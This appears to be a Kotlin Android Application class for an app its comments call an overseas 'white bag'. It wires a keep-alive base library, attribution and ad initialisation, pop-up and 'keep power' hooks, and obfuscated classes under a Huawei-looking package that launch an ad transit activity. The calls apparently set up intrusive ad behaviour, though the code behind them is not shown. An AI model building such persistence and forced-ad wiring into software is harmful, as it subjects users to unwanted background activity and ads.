package a

import android.app.Application
import android.os.Bundle
import android.content.Intent
import com.example.overseaswhitebag.AdjustTokens
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import com.b.w.BaseJksApplication
import hewn.wgv.lysm.base.APPContext
import hewn.wgv.lysm.base.OverseaAppHost
import hewn.wgv.lysm.base.OverseaAppInitializer

class ERFG : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: ERFG? = null
    }

    override fun onCreate() {
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }

    override fun initPopPower() {
        df.vir(insApp)
    }

    override fun initKeepPower(app: Application) {
        Helpers.setGuiyin(true)
    }


}